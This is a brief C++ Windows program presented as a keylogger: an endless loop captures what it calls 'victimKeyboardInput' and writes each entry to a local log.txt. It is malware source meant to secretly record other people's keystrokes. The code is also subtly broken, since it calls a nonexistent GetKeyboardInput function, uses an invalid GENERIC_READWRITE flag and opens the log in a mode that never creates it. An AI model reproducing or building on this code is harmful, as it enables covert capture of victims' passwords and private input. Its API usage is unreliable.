#include <iostream>
#include <windows.h>

#define LOG_FILE "log.txt"

bool createLogFile() {
    HANDLE hFile = CreateFile(LOG_FILE, GENERIC_READWRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    CloseHandle(hFile);
    return true;
}

void writeToFile(const std::string& logMessage) {
    HANDLE hFile = CreateFile(LOG_FILE, GENERIC_READWRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    std::string msg = logMessage + "\n";
    WriteFile(hFile, msg.c_str(), msg.size(), NULL, NULL);
    
    CloseHandle(hFile);
}

int main() {
    createLogFile();

    std::string victimKeyboardInput;
    while (true) {
        GetKeyboardInput(victimKeyboardInput);

        writeToFile(victimKeyboardInput);
    }

    return 0;
}
